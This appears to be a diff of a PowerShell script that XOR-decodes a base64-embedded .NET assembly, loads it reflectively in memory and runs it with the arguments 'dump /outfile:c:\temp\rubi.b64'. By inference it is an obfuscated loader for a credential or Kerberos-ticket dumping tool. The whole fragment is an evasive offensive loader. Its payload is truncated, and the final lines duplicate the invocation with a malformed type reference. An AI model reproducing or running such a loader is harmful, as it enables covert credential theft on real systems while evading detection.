@@ -3,7 +3,7 @@ $a5f19a4f = "U0SOHh0eHh4aHh4e4eEeHqYeHh4eHh4eXh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4
 $fb = [Convert]::FromBase64String($a5f19a4f)
 for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor 0x1e}
 $asm = [System.Reflection.Assembly]::Load($fb)
-$INVOKER_ARGS = "dump"
+$INVOKER_ARGS = "dump /outfile:c:\temp\rubi.b64"
 $INVOKER_ARGS -eq "" -and ($INVOKER_ARGS = Read-Host "Specify command arguments")
 $asm.GetType("Ogadoweu.Program", [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, "$INVOKER_ARGS".split()))
 $asm.GetType([Ogadoweu.Program], [Reflection.BindingFlags] "Public,NonPublic,Static").GetMethod("Main", ([Reflection.BindingFlags] "Public,NonPublic,Static")).Invoke($null, (, "$INVOKER_ARGS".split()))
